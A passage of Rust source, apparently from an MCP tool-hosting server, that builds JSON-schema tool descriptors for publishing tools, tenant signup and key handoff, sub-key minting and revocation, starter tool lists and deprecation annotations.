fn schema_checked(props: Value, required: &[&str]) -> Map<String, Value> {
    schema(props, required)
}

/// The `admin.*` descriptors, for `host_args` to compile the checked ones
/// beside [`host_tool_descriptors`].
pub fn admin_tool_descriptors() -> Vec<Tool> {
    admin_tools()
}

/// The `admin.*` descriptors with [`crate::host_args::VALIDATED_KEY`]
/// written by the one post-pass.
fn admin_tools() -> Vec<Tool> {
    let mut tools = admin_tools_raw();
    crate::host_args::mark_validated(&mut tools);
    tools
}

/// `host.tool_publish`'s own properties (minus `host_schema`'s
/// `tenant_key`, a connection-auth concern with no counterpart in a
/// manifest entry), factored out so both its own `Tool::new` descriptor
/// below and [`tool_publish_input_schema`] build from the exact same
/// literal -- a hand-copied twin here would drift the moment either changed.
pub(crate) fn tool_publish_props(kinds: &KindRegistry) -> Value {
    json!({
        "name": {
            "type": "string",
            "pattern": crate::drafter::TOOL_NAME_REGEX,
            "description": "Local name for the new tool; must match ^[a-z][a-z0-9_]{1,40}$.",
        },
        "kind": {
            "type": "string",
            // PRD-mcphost-publish-schema-from-registry requirement 1: the
            // enum is the registry's own set (names, aliases, outcome
            // words), never a literal list.
            "enum": kinds.publish_kind_enum(),
            "description": format!(
                "Which registered kind to publish under: one of this field's `enum` \
                (host.quickstart with no kind lists every kind, alias and recipe). A job-word \
                alias in the enum also resolves here -- webhook-style words for an inbound \
                webhook, cron-style words for a timed run -- both resolve to kind http and the \
                descriptor comes back with resolved_from naming the alias you asked for. \
                Error contract per kind: {}.",
                kinds
                    .all()
                    .map(|k| format!("{} ({})", k.name(), k.contract().summary_line()))
                    .collect::<Vec<_>>()
                    .join("; ")
            ),
        },
        "spec": {
            "type": "object",
            // PRD-mcphost-sandbox-bridge-discoverability requirement 6
            // (AC6): the python kind's own "network" field hint
            // (`kinds::python::python_field_hint`) is embedded here so its
            // `import mcphost`/`mcphost.table` mention reaches tools/list,
            // not just a rejected publish's error message.
            "description": format!(
                "The kind-specific spec object; see host.quickstart(kind) for a filled-in \
                 example. For python's network field: {}.",
                crate::kinds::python::python_field_hint("network")
                    .map(|(hint, _)| hint)
                    .unwrap_or_default()
            ),
        },
        "scopes": {
            "type": "array",
            "items": {"type": "string"},
            "description": "OAuth scopes a token must carry (directly, or via mcp) to reach \
                this tool: catalogued names from host.oauth.scopes, or the built-ins read/write. \
                At most 8. Omit (or [] ) to require only mcp -- unaffected by any catalog.",
        },
        "visibility": {
            "type": "string",
            "enum": crate::sharing::Visibility::schema_enum(&crate::sharing::Visibility::PUBLISHABLE),
            "description": "Who may find the tool (default private). unlisted: callable by full \
                name and readable by host.catalog.get, never listed. public: listed in the \
                catalog, and refused (untested_tool_cannot_be_public) unless the current \
                version passes its dry run first. Use host.tool_share for group or url.",
        },
        "tags": {
            "type": "array",
            "items": {"type": "string"},
            "description": "Catalog tags: at most 16, each 1-32 chars of a-z, 0-9 and '-', \
                stored lower-case and deduped.",
        },
    })
}

/// PRD-mcphost-publish-schema-from-registry requirement 2: one `if/then`
/// branch per registered kind, keyed on the sibling `kind` argument, whose
/// `spec` schema lists exactly `known_spec_fields()` plus
/// `UNIVERSAL_SPEC_FIELDS` -- the sets `check_unknown_spec_field` accepts
/// -- with `additionalProperties: false`. `required` is the kind's single
/// unconditional field when it has one. Alias and outcome-word kinds get
/// no branch (the server resolves them). Rendered as top-level `allOf`
/// entries (`if/then` can only read `kind` from the parent object), which
/// the contract comparator's one-level `properties` walk does not visit.
fn tool_publish_spec_branches(kinds: &KindRegistry) -> Value {
    let branches: Vec<Value> = kinds
        .all()
        .map(|kind| {
            let mut fields: Vec<&str> = kind.known_spec_fields().to_vec();
            for universal in crate::kinds::UNIVERSAL_SPEC_FIELDS {
                if !fields.contains(universal) {
                    fields.push(universal);
                }
            }
            fields.sort_unstable();
            let properties: Map<String, Value> = fields
                .into_iter()
                .map(|field| {
                    let schema = match kind.spec_field_description(field) {
                        _ if field == "ui" => crate::form_page::ui_field_schema(),
                        Some(description) => json!({"description": description}),
                        None => match crate::kinds::kinddoc::UNIVERSAL_FIELD_DOCS.iter().find(|d| d.name == field) {
                            Some(doc) => json!({"description": doc.meaning}),
                            None => json!({}),
                        },
                    };
                    (field.to_string(), schema)
                })
                .collect();
            let mut spec = json!({
                "type": "object",
                "properties": properties,
                "additionalProperties": false,
            });
            if let Some(required) = kind.required_spec_field() {
                spec["required"] = json!([required]);
            }
            json!({
                "if": {"properties": {"kind": {"const": kind.name()}}, "required": ["kind"]},
                "then": {"properties": {"spec": spec}},
            })
        })
        .collect();
    Value::Array(branches)
}

/// `host.tool_publish`'s input schema (`schema` + the per-kind `allOf`
/// branches), optionally wrapped by `host_schema` for the `tenant_key`.
fn tool_publish_schema(kinds: &KindRegistry, with_tenant_key: bool) -> Map<String, Value> {
    let mut props = tool_publish_props(kinds);
    let mut out = if with_tenant_key {
        // `force` is a call-time switch of the control-plane verb, not part of a
        // manifest entry, so it is declared only on the verb's own descriptor.
        if let Some(obj) = props.as_object_mut() {
            obj.insert(
                "force".to_string(),
                json!({
                    "type": "boolean",
                    "description": "Publish a chain whose mapping can never resolve (verdict will_fail) anyway; \
                        the response's gates entry then carries forced: true. Default false.",
                }),
            );
        }
        host_schema(props, TOOL_PUBLISH_REQUIRED)
    } else {
        schema(props, TOOL_PUBLISH_REQUIRED)
    };
    out.insert("allOf".to_string(), tool_publish_spec_branches(kinds));
    out
}

/// The JSON types an argument "any JSON value" accepts: a schema property that takes
/// anything still states `type` (PRD-mcphost-schema-shape-agreement R3), as this list.
pub const ANY_JSON_TYPES: [&str; 7] = ["string", "number", "integer", "boolean", "array", "object", "null"];

const TOOL_PUBLISH_REQUIRED: &[&str] = &["name", "kind", "spec"];

/// PRD-mcphost-tenant-data-export P1 requirement 4 / AC5: the plain
/// (no `tenant_key`) JSON Schema a `host.tool_publish` call's own args are
/// validated against -- `export::build_archive`'s `manifest.json` entries
/// are exactly `{name, kind, spec}` objects, and this crate's own test
/// suite checks them against this SAME schema (not a hand-copied twin) so
/// AC5's proof can never silently drift from what a real `host.tool_publish`
/// call actually requires.
pub fn tool_publish_input_schema(kinds: &KindRegistry) -> Value {
    Value::Object(tool_publish_schema(kinds, false))
}

/// PRD-mcphost-session-key requirement 2 / AC3: every `host.*` descriptor
/// (never `signup`'s or an `admin.*` descriptor -- requirement 10) gains an
/// optional string `tenant_key` property, the key `signup` returned,
/// required only when the connection carries no `Authorization` header.
/// Generated once here and applied to each `host_tools()` entry below
/// rather than hand-edited into ten separate `json!` blocks, which would
/// drift.
///
/// PRD-mcphost-session-bound-tenant-after-signup requirement 9 (AC12): the
/// description now also states the third precedence step -- on the
/// connection that ran `signup`/`host.redeem` the key is optional, because
/// that connection is already bound to the tenant it created. Reading this
/// is how an agent that just signed up learns it does not have to repeat
/// the key, which is the whole failure this PRD exists to remove.
///
/// PRD-mcphost-implicit-signup requirement 5: the final sentence no longer
/// describes a `tenant_key_missing` refusal -- omitting this argument on a
/// connection with neither a header nor a prior signup now implicitly
/// signs that connection up instead (requirement 1), so the description
/// says that, pointing at `host.whoami`'s `source` field as how to tell.
pub(crate) fn host_schema(mut props: Value, required: &[&str]) -> Map<String, Value> {
    if let Some(obj) = props.as_object_mut() {
        obj.insert(
            "tenant_key".to_string(),
            json!({
                "type": "string",
                "description": "The key `signup` returned. Optional on the connection that \
                    ran signup (or host.redeem): that connection is already bound to the \
                    tenant it created, so later calls on it need no tenant_key. On a \
                    connection with no Authorization: Bearer header and no prior signup, \
                    omitting it implicitly signs that connection up as a brand-new tenant \
                    and runs this call as it -- see host.whoami's source field. When both a \
                    header and this argument are present, the header wins.",
            }),
        );
    }
    schema(props, required)
}

/// PRD-mcphost-input-schema-is-the-validator R1: `host_schema` plus an
/// `anyOf` of one `{required: [alt]}` branch per alternative, for a tool
/// whose handler wants "one of these arguments" -- the shape `required`
/// alone cannot state. `alternatives` is the exact set the handler's
/// either-or check names.
fn host_schema_any(props: Value, required: &[&str], alternatives: &[&str]) -> Map<String, Value> {
    host_schema_extra(props, required, json!({"anyOf": any_of_required(alternatives)}))
}

/// `schema` plus an `anyOf` of one `{required: [alt]}` branch per alternative:
/// the either-or counterpart of [`host_schema_any`] for an `admin.*` tool.
fn schema_any(props: Value, required: &[&str], alternatives: &[&str]) -> Map<String, Value> {
    let mut obj = schema(props, required);
    obj.insert("anyOf".to_string(), any_of_required(alternatives));
    obj
}

/// `host_schema` plus extra top-level schema keywords (`anyOf` with
/// multi-argument branches, `allOf` with an `if`/`then`) for the
/// requirements `required` alone cannot state.
fn host_schema_extra(props: Value, required: &[&str], extra: Value) -> Map<String, Value> {
    let mut obj = host_schema(props, required);
    if let Value::Object(extra) = extra {
        obj.extend(extra);
    }
    obj
}

/// `host_schema` for a tool whose descriptor has been checked against its
/// handler and is therefore the validator for it (see [`crate::host_args`]):
/// the schema carries [`crate::host_args::VALIDATED_KEY`] and dispatch refuses
/// by it before the handler runs.
fn host_schema_checked(props: Value, required: &[&str]) -> Map<String, Value> {
    host_schema_extra(props, required, json!({}))
}

/// PRD-mcphost-table-import-from-url R1: exactly one of `sources` -- `oneOf`
/// refuses two at once (naming both fields), `anyOf` is the either-or form the
/// schema-derived call builders and the `insch_*` readers understand.
fn import_one_of(sources: &[&str]) -> Value {
    json!({"anyOf": any_of_required(sources), "oneOf": any_of_required(sources)})
}

/// PRD-mcphost-table-import-from-url R1: the `source_url` property of
/// `host.table.create` / `host.table.append`.
fn import_source_url_schema() -> Value {
    json!({
        "type": "string",
        "description": "An https URL of a CSV (RFC 4180, header row first) or JSON Lines file to \
            load. Public hosts only; at most 3 redirects, 30 s, and the plan's import byte cap.",
    })
}

/// The `csv_text` property of `host.table.create` / `host.table.append`.
fn import_csv_text_schema() -> Value {
    json!({
        "type": "string",
        "description": "The CSV itself (header row first, at most 1 MB), for a client that \
            holds the data but has no file tool.",
    })
}

/// The `import_id` property of `host.table.create` / `host.table.append`.
fn import_id_schema() -> Value {
    json!({
        "type": "string",
        "maxLength": 128,
        "description": "Optional retry key for a source_url / csv_text import: the same id \
            within 24 hours returns the first result and writes nothing.",
    })
}

/// `[{"required": [a]}, {"required": [b]}, ...]`, one branch per alternative.
pub(crate) fn any_of_required(alternatives: &[&str]) -> Value {
    Value::Array(alternatives.iter().map(|a| json!({"required": [a]})).collect())
}

/// PRD-mcphost-status-feed requirement 2: the `mcp` self-probe's
/// `tools/list` half -- builds the exact same anonymous tool listing
/// [`McpHostHandler::list_tools`]'s `Auth::Anonymous` branch does, in
/// process, and returns how many tools came back (always at least
/// `signup` itself; a real regression here would return 0). Kept in this
/// module rather than `statusfeed.rs` since `signup_tool`/`host_tools` are
/// private to it.
///
/// PRD-mcphost-one-next-tool requirement 1: the anonymous branch now
/// returns [`starter_tools`], not the full `host_tools(kinds, false)` set --
/// this probe follows it so a starter-set regression (e.g. an empty list)
/// still trips the self-check.
pub(crate) fn self_check_tools_list(state: &AppState) -> usize {
    starter_tools(&state.kinds).len()
}

/// PRD-mcphost-feedback-tool-and-ledger: the two verbs an anonymous caller
/// may use without being implicitly signed up.
fn is_feedback_tool(name: &str) -> bool {
    matches!(name, "host.feedback.send" | "host.feedback.list" | "host.feedback.get")
}

/// The control-plane verbs `call_tool_inner` answers before (and without)
/// `dispatch_tenant_tool_inner`, because they are reachable with no tenant.
fn is_pre_dispatch_tool(name: &str) -> bool {
    is_feedback_tool(name)
        || matches!(name, "host.quickstart" | "host.help.search" | "host.help.get" | "host.errors" | "billing.plans" | "host.redeem")
}

/// PRD-mcphost-one-next-tool requirement 1 (AC1): the starter set an
/// `Auth::Anonymous`/`Auth::Invalid` session's `tools/list` returns --
/// `signup` first (AC1), then eleven `host.*`/`billing.*` tools a fresh
/// agent needs to reach and share its first published tool. One constant,
/// per the requirement's own "the set is one constant" clause; overridden
/// at read time by `MCPHOST_STARTER_TOOLS` is explicitly P2/out of scope
/// here (Non-goals).
const STARTER_TOOL_NAMES: &[&str] = &[
    "host.quickstart",
    "host.help.search",
    "host.help.get",
    "host.errors",
    "host.redeem",
    "billing.plans",
    "host.whoami",
    "host.tool_publish",
    "host.tool_call",
    "host.tool_test",
    "host.state.set",
    "host.state.get",
    "host.state.list",
    "host.tool_share",
    "host.feedback.send",
    "host.feedback.list",
    "host.resume",
];

/// A filter over [`host_tools`]'s full descriptor set, not a second source
/// of truth (requirement 1's own technical consideration) -- `signup` first,
/// then each [`STARTER_TOOL_NAMES`] entry in that fixed order, carrying its
/// real descriptor (schema included) from the authoritative set.
fn starter_tools(kinds: &KindRegistry) -> Vec<Tool> {
    let full = host_tools(kinds, false);
    let mut tools = Vec::with_capacity(STARTER_TOOL_NAMES.len() + 1);
    tools.push(signup_tool());
    for name in STARTER_TOOL_NAMES {
        if let Some(tool) = full.iter().find(|t| t.name == *name) {
            tools.push(tool.clone());
        }
    }
    tools
}

/// PRD-mcphost-end-user-identity requirement 5: the `end_user` argument
/// every scoped `host.state.*` op shares -- `"self"` resolves to the
/// call's own verified identity (errors `end_user_required` if absent);
/// an explicit subject string is allowed only when the call carries no
/// identity of its own (errors `end_user_explicit_forbidden` otherwise,
/// and marks the op's own result `impersonated: true`); omitted or `null`
/// stays tenant-wide, unchanged from before this PRD.
fn end_user_arg_schema() -> Value {
    json!({
        "type": ["string", "null"],
        "description": "\"self\" for the caller's own verified end-user identity, an \
            explicit subject (only when this call carries no end-user identity of its \
            own), or omit/null for the tenant-wide value.",
    })
}

pub(crate) fn signup_tool() -> Tool {
    Tool::new(
        "signup",
        "Explicit signup, for a client that cannot keep a session across calls: create a \
         tenant and receive a bearer key and namespace. Unauthenticated. Most clients never \
         need this -- any other host.*/billing.* call from a fresh connection creates a \
         tenant implicitly and returns its own /u/<secret>/mcp URL in the response's \
         onboarding field. Recommended here: pass handoff: true to receive a short-lived, \
         single-use handoff_token instead of the raw key -- redeem it once with host.redeem \
         to get the key, so a transcript of this call and the redeem call, if it leaks, \
         carries a dead credential. The raw-key path (handoff omitted) stays fully supported.",
        schema(signup_arg_properties(), &signup_required_args()),
    )
}

/// `signup`'s `properties`, one per [`control::SIGNUP_ARGS`] row.
fn signup_arg_properties() -> Value {
    let mut props = Map::new();
    for a in control::SIGNUP_ARGS {
        let mut prop = Map::new();
        prop.insert("type".to_string(), json!(a.ty));
        if let Some(pattern) = a.pattern {
            prop.insert("pattern".to_string(), json!(pattern));
        }
        prop.insert("description".to_string(), json!(a.description));
        props.insert(a.name.to_string(), Value::Object(prop));
    }
    Value::Object(props)
}

/// `signup`'s `required`, from [`control::SIGNUP_ARGS`].
fn signup_required_args() -> Vec<&'static str> {
    control::SIGNUP_ARGS.iter().filter(|a| a.required).map(|a| a.name).collect()
}

/// PRD-mcphost-publish-first-try requirement 1 (AC1) named `host.tool_test`
/// as the dry run to try first; PRD-mcphost-surface-fluidity requirement 6
/// (P1, AC7) replaced the original approach -- one paragraph *per registered
/// kind*, each with a full example spec inlined here -- with a pointer to
/// `host.quickstart(kind)`, which already renders that same
/// [`crate::kinds::Kind::example`] filled in with the caller's own namespace
/// (see `control::quickstart`'s `steps`). Kept under 600 characters total
/// (asserted by `tests/surface_ac07_tool_publish_description_length.rs`) so
/// it reads in one glance in a `tools/list` response; per-kind detail lives
/// in `host.quickstart` instead of being re-explained on every kind's own
/// publish.
fn tool_publish_description(kinds: &KindRegistry) -> String {
    // PRD-mcphost-publish-schema-from-registry P1: no literal
    // kind list here -- the `kind` argument's `enum` is the one rendering.
    let mut out = String::from(
        "Publish a tool of a registered kind (e.g. python, http or echo; the kind \
         argument's enum lists them all) under this tenant's namespace. Call host.quickstart(kind) first for a filled-in example spec and the full \
         publish-to-call sequence. Python's sandbox API: import mcphost (mcphost.table, \
         mcphost.state, mcphost.docs)."
    );
    // PRD-mcphost-sandbox-ready P1 requirement 7 (AC8): a client that reads
    // this description before publishing must still see, right here, that a
    // kind is currently rejected -- so it never sends the doomed call.
    // `sandbox_status()` is `None` for every kind with no sandbox concept
    // (`echo`, `http`), so this is a no-op for them.
    for name in kinds.names() {
        let Some(kind) = kinds.get(name) else {
            continue;
        };
        if let Some(status) = kind.sandbox_status()
            && !status.ready
        {
            out.push_str(&format!(
                " NOTE: {name}-kind publishes are currently rejected on this host with \
                 sandbox_unavailable ({}).",
                status.detail
            ));
        }
    }
    out.push_str(
        " Name must match ^[a-z][a-z0-9_]{1,40}$; a rejection names the failing field and a \
         corrected example. Try host.tool_test before a real call.",
    );
    out
}

/// PRD-mcphost-tool-test AC9: `host.spec_test`, unlike every other `host.*`
/// descriptor, must be absent from `tools/list` for an anonymous/invalid
/// caller (present, and callable, only once authenticated) -- `authenticated`
/// gates pushing it onto the returned vec; every other `host.*` tool is
/// unaffected and stays visible pre-auth (PRD-mcphost-session-key).
/// PRD-mcphost-surface-fluidity requirement 1 / AC2: the one-sentence case
/// each dry-run tool's description states before pointing at
/// `host.quickstart`'s `try_before_call` table (built by
/// `control::quickstart`) for the other three. Kept as constants -- rather
/// than inlined into the `Tool::new` calls below -- so the length test
/// (`tests/surface_ac02_dry_run_descriptions.rs`) and this function read the
/// exact same source, per the PRD's own Technical considerations.
// PRD-mcphost-tool-test-truth P0 requirement 1: names `verdict` (AC5's
// own contract test checks every kind's dry-run response carries one) --
// kept under the 160-char cap `tests/surface_ac02_dry_run_descriptions.rs`
// enforces, so something had to go; "writes are rolled back and reported
// under dry_run" compresses to "writes rolled back" without losing its
// meaning.
const TOOL_TEST_DESC: &str =
    "Dry-run a published tool by name: verdict (pass/will_fail/unverifiable), writes rolled back \
     (dry_run); see host.quickstart.";
const BRIDGE_TEST_DESC: &str =
    "Dry-run an unpublished http spec against its real upstream; for the other cases see host.quickstart.";
const SPEC_TEST_DESC: &str =
    "Dry-run an unpublished spec of any kind with example invocations; for the other cases see host.quickstart.";
// PRD-mcphost-tool-run-envelope requirement 3 / AC3: names the standard
// result envelope (`result.payload`) alongside the run metadata this
// dry-run adds on top of it, so the descriptor a caller reads before ever
// dispatching matches the shape it gets back.
const TOOL_RUN_DESC: &str =
    "Debug-run a published python tool: result.payload plus duration_ms and exit_code; for the other cases see host.quickstart.";

/// PRD-mcphost-first-tool-from-description R3: the descriptor
/// `list_tools` adds while a draft model is configured.
fn tool_from_description_tool() -> Tool {
    Tool::new(
        "host.tool_from_description",
        "Describe a tool in one sentence; the host drafts a python spec, tests it, publishes it, \
         and returns the qualified name, public_url, source and test result.",
        host_schema(
            json!({
                "description": {"type": "string", "description": "What the tool should do, in one sentence."},
                "name": {"type": "string", "description": "Optional tool name; default is the model's proposal."},
                "kind": {"type": "string", "enum": crate::drafter::DRAFT_KINDS, "description": "Only python is drafted."},
                "share": {"type": "boolean", "description": "Mint a public url (default true)."},
            }),
            &["description"],
        ),
    )
}

/// PRD-mcphost-surface-fluidity requirement 4 (AC5): the name set
/// `www/llms.txt`'s generated tool section is built from -- the
/// authenticated superset of `host_tools` (a strict superset of the
/// anonymous one; the only gated entry is `host.spec_test`). `signup` is
/// deliberately not included here: it's visible only pre-auth, and
/// `llms_txt::tenant_tool_names` adds it back so the *union* across both
/// auth states is what gets compared against a live `tools/list`. Pure and
/// synchronous -- no `AppState`, no DB -- so `mcphost llms-txt` and
/// integration tests can call it without a running server.
pub fn llms_txt_tool_names(kinds: &KindRegistry) -> Vec<String> {
    host_tools(kinds, true)
        .into_iter()
        .map(|t| t.name.to_string())
        .collect()
}

/// PRD-mcphost-host-tool-deprecation requirement 1: the same authenticated
/// tool-descriptor set [`llms_txt_tool_names`] builds names from, exposed
/// here with the full [`Tool`] (schema included) for
/// [`crate::api_contract::dump_contract`]'s AC1 contract dump and
/// `host.changelog`'s AC6 addition list. Pure and synchronous, same reason
/// as `llms_txt_tool_names` -- no `AppState`, no DB.
pub fn host_tool_descriptors(kinds: &KindRegistry) -> Vec<Tool> {
    host_tools(kinds, true)
}

/// PRD-mcphost-spec-unknown-field-rejection requirement 2 (AC4): `name`'s
/// own top-level argument keys, read straight off the exact schema
/// `tools/list` advertises for it -- never a second hand-copied list, so a
/// caller building an `unknown_argument` rejection's `data.known` can never
/// drift from what the tool's own `inputSchema.properties` actually says.
/// `None` when `name` isn't a `host.*`/`billing.*` tool this registry
/// builds at all.
pub fn known_control_plane_args(name: &str, kinds: &KindRegistry) -> Option<Vec<String>> {
    host_tool_descriptors(kinds)
        .into_iter()
        .find(|t| t.name.as_ref() == name)
        .and_then(|t| t.input_schema.get("properties").and_then(Value::as_object).cloned())
        .map(|props| props.keys().cloned().collect())
}

/// PRD-mcphost-host-tool-deprecation requirement 3 / AC3: mutates
/// `tools` in place so every deprecated tool or field carries an
/// `x-deprecated` object (on the tool's top-level schema for a whole-tool
/// entry, on the specific `properties.<field>` sub-schema for a
/// single-level field entry) and a `[DEPRECATED ...]` note prepended to
/// its description -- the exact two places requirement 3 names ("in the
/// `description` and in an `x-deprecated` object"). A no-op when
/// `deprecations` is empty (the committed `contracts/deprecations.json`,
/// today). Called once in `list_tools`, after every branch has assembled
/// its own `tools` vec, so every auth state sees the same annotations.
fn annotate_deprecated_tools(tools: &mut [Tool], deprecations: &[crate::api_contract::Deprecation]) {
    for tool in tools.iter_mut() {
        let name = tool.name.to_string();
        for dep in deprecations.iter().filter(|d| !d.narrowing_only) {
            let note = format!(
                "[DEPRECATED since {}, sunset {}: use {} instead] ",
                dep.since, dep.sunset, dep.replacement
            );
            let x_deprecated = json!({
                "since": dep.since,
                "sunset": dep.sunset,
                "replacement": dep.replacement,
            });
            if dep.path == name {
                let existing = tool.description.clone().unwrap_or_default();
                tool.description = Some(Cow::Owned(format!("{note}{existing}")));
                Arc::make_mut(&mut tool.input_schema).insert("x-deprecated".to_string(), x_deprecated);
            } else if let Some(field) = dep.path.strip_prefix(&format!("{name}.")) {
                if field.contains('.') {
                    // Only single-level fields are annotated -- see
                    // `api_contract::diff_properties`'s own "flat schema"
                    // doc for why this crate's descriptors never need more.
                    continue;
                }
                let schema = Arc::make_mut(&mut tool.input_schema);
                if let Some(field_schema) = schema
                    .get_mut("properties")
                    .and_then(Value::as_object_mut)
                    .and_then(|props| props.get_mut(field))
                    .and_then(Value::as_object_mut)
                {
                    let existing = field_schema
                        .get("description")
                        .and_then(Value::as_str)
                        .unwrap_or("")
                        .to_string();
                    field_schema.insert("description".to_string(), json!(format!("{note}{existing}")));
                    field_schema.insert("x-deprecated".to_string(), x_deprecated);
                }
            }
        }
    }
}

/// `args` without a string `confirm` token (a gated verb's own handler never
/// sees it); a boolean `confirm: true` is `host.table.drop`'s lineage-gate
/// flag and passes through.
fn confirm_stripped(args: &Value) -> Value {
    let mut args = args.clone();
    if let Some(obj) = args.as_object_mut()
        && obj.get("confirm").is_some_and(Value::is_string)
    {
        obj.remove("confirm");
    }
    args
}

/// PRD-mcphost-acting-for-in-ledger-and-audit R1: `_meta.acting_for` on a
/// completed call, `data.acting_for` on a failed one.
fn attach_acting_for(
    result: Result<CallToolResponse, McpError>,
    af: &crate::subkeys::ActingFor,
) -> Result<CallToolResponse, McpError> {
    match result {
        Ok(CallToolResponse::Complete(mut r)) => {
            r.meta.get_or_insert_with(Default::default).0.insert("acting_for".to_string(), af.to_json());
            Ok(CallToolResponse::Complete(r))
        }
        Err(mut e) => {
            let data = e.data.get_or_insert_with(|| json!({}));
            if let Some(obj) = data.as_object_mut() {
                obj.insert("acting_for".to_string(), af.to_json());
            }
            Err(e)
        }
        other => other,
    }
}

/// R5: marks a scratch tenant's response `_meta.scratch: true`.
fn mark_scratch(value: &mut Value) {
    if let Some(obj) = value.as_object_mut() {
        let meta = obj.entry("_meta").or_insert_with(|| json!({}));
        if let Some(meta) = meta.as_object_mut() {
            meta.insert("scratch".to_string(), json!(true));
            // The registered output schema requires `_meta.dry_run`; a real
            // (non-dry) scratch response says so rather than omitting it.
            meta.entry("dry_run").or_insert_with(|| json!(false));
        }
    }
}

/// PRD-mcphost-tool-test AC9: `host.spec_test`, unlike every other `host.*`
/// descriptor, must be absent from `tools/list` for an anonymous/invalid
/// caller (present, and callable, only once authenticated) -- `authenticated`
/// gates pushing it onto the returned vec; every other `host.*` tool is
/// unaffected and stays visible pre-auth (PRD-mcphost-session-key).
///
/// PRD-mcphost-surface-fluidity requirement 3 / AC4: every property here
/// (required or not) carries a `description`, including `host.bridge_test.spec`
/// and `host.spec_test.invocations`, which previously had none -- see
/// `tests/surface_ac04_required_field_descriptions.rs`.
/// How many canonical (non-alias) `host_tools` entries declare each registry
/// scope as `_meta.scope`; the `verbs (count)` column of the llms.txt table.
pub fn scope_verb_counts(kinds: &KindRegistry) -> std::collections::HashMap<crate::scopes::Scope, usize> {
    let mut counts = std::collections::HashMap::new();
    for tool in host_tools(kinds, true) {
        let Some(meta) = tool.meta.as_ref() else { continue };
        if meta.0.contains_key("alias_of") {
            continue;
        }
        if let Some(scope) = meta.0.get("scope").and_then(Value::as_str).and_then(crate::scopes::Scope::parse) {
            *counts.entry(scope).or_insert(0) += 1;
        }
    }
    counts
}

pub(crate) fn host_tools(kinds: &KindRegistry, authenticated: bool) -> Vec<Tool> {
/// The `host_tools` descriptor table, built in `host_tools_part_NN` chunks of 16
/// descriptors each. One `vec![...]` of ~200 `json!` schemas in a single
/// function made `host_tools` a ~275 KB debug-build stack frame (every `json!`
/// temporary gets its own slot) -- enough to overflow a 2 MiB test-thread stack
/// when `host.trigger.set` reaches it through `known_control_plane_args` from
/// inside the forwarded `host.tool_call` async chain (verbfwd_ac01). Each chunk is
/// `#[inline(never)]`, so only the largest chunk is live at once; the table and
/// its order are unchanged.
#[inline(never)]
fn host_tools_part_01(kinds: &KindRegistry) -> Vec<Tool> {
    vec![
        Tool::new(
            "host.whoami",
            "Return the calling tenant's identity, including key_age_s and key_rotated_at \
             for auditing credential hygiene.",
            host_schema(json!({}), &[]),
        ),
        // PRD-mcphost-handoff-token requirement 2 / AC2: like
        // `host.quickstart`, reachable unauthenticated (the handoff_token
        // itself is the proof -- `resolve_tenant_key_auth`'s outcome for
        // this call is never consulted, see `handler::call_tool`'s
        // `(_, "host.redeem")` arm) but still built with `host_schema` for
        // the same reason `host.quickstart` is: every host.* descriptor
        // carries the optional `tenant_key` property (PRD-mcphost-session-key
        // AC3), whether or not this particular call ever reads it.
        Tool::new(
            "host.redeem",
            "Exchange a signup(handoff: true) handoff_token for the tenant key it was issued \
             for. Single-use: a second redemption fails with handoff_token_redeemed; past its \
             expiry it fails with handoff_token_expired. Unauthenticated -- the token itself is \
             the proof.",
            host_schema(
                json!({
                    "handoff_token": {
                        "type": "string",
                        "description": "The handoff_token signup(handoff: true) returned.",
                    },
                }),
                &["handoff_token"],
            ),
        ),
        // PRD-mcphost-handoff-token requirement 3 / AC3: authenticated like
        // every other host.* tenant tool -- host_schema's tenant_key
        // property is exactly the credential being rotated here.
        Tool::new(
            "host.key.rotate",
            "Issue a new tenant key and invalidate the current one immediately: every other \
             call using the old key fails as unauthenticated from this point on. Returns the \
             new key exactly once -- use it (as tenant_key or Authorization) for every call \
             after this one. When other clients have joined (see the clients field of host.whoami), a client rotates only its own \
             credential; all: true rotates every client and the join code.",
            host_schema(
                json!({
                    "all": {
                        "type": "boolean",
                        "description": "Rotate every client of the workspace (each sibling's URL, your key and URL) and the join code. Default false: only the calling client's credential changes.",
                    },
                }),
                &[],
            ),
        ),
        Tool::new(
            "host.client.revoke",
            "Revoke one client of this workspace (a sibling that joined through join_url, listed in the \
             clients field of host.whoami): its URL answers tenant_key_invalid from the next call. The last \
             remaining client cannot be revoked (last_client).",
            host_schema(
                json!({
                    "client_id": {
                        "type": "string",
                        "description": "The client_id of the client to revoke, from the clients field of host.whoami.",
                    },
                }),
                &["client_id"],
            ),
        ),
        // PRD-mcphost-key-scoped-to-tools R2: primary key only.
        Tool::new(
            "host.key.mint",
            "Mint a sub-key that opens only the named tools (your own, or shared-in qualified \
             names) plus host.whoami/host.quickstart, expires after ttl_s, and survives \
             host.key.rotate. Returns the key once. Primary key only.",
            host_schema(
                json!({
                    "tools": {
                        "type": "array",
                        "items": {"type": "string"},
                        "minItems": 1,
                        "maxItems": 64,
                        "description": "Tool names the sub-key may call: your own tools by local name, shared-in tools by qualified <namespace>.<name>.",
                    },
                    "ttl_s": {
                        "type": "integer",
                        "minimum": 60,
                        "maximum": 7776000,
                        "description": "Lifetime in seconds (default 2592000 = 30 days).",
                    },
                    "label": {
                        "type": "string",
                        "description": "Name for host.key.revoke / host.key.list; unique per tenant (default: generated).",
                    },
                }),
                &["tools"],
            ),
        ),
        // PRD-mcphost-key-scoped-to-tools R5.
        Tool::new(
            "host.key.list",
            "List this tenant's sub-keys as a delegation tree: label, depth, parent, scopes, \
             tools, created_at, expires_at, revoked_at, last_used_at, children. Never returns a \
             key. Primary key only.",
            host_schema(json!({}), &[]),
        ),
        Tool::new(
            "host.key.revoke",
            "Revoke the sub-key with this label: its very next call fails key_revoked. With \
             cascade: true the whole subtree under it is revoked in one transaction and returns \
             {revoked, labels}; without it a key that still has live descendants fails \
             has_children {count}. Does not touch the primary key. Primary key only.",
            host_schema(
                json!({
                    "label": {
                        "type": "string",
                        "description": "The label host.key.mint / host.key.delegate returned (see host.key.list).",
                    },
                    "cascade": {
                        "type": "boolean",
                        "description": "Also revoke every key delegated beneath it (default false).",
                    },
                }),
                &["label"],
            ),
        ),
        // PRD-mcphost-call-audit-export R2: the tenant's own call log.
        Tool::new(
            "host.calls.list",
            "List the calls made with this tenant's keys, newest first: when, which credential \
             (primary, sub_key, oauth, trigger, cron, webhook, shared_caller), tool, outcome, \
             duration and byte sizes. Filter by key_label, tool, outcome or credential. A sub-key \
             sees only its own rows.",
            host_schema(
                json!({
                    "since": {"type": ["string", "integer"], "description": "Window start: \"-24h\", \"-30d\", a YYYY-MM-DD day, an RFC 3339 instant or Unix epoch seconds (default -24h)."},
